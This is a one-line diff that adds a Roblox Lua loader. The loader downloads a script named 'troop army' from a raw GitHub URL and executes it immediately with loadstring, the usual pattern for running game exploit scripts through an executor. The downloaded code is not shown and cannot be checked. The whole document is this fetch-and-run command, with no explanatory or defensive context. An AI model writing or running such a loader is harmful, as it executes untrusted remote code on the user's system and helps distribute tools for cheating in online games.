@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PerfectusMim/PerfectusMim/main/troop%20army"))()
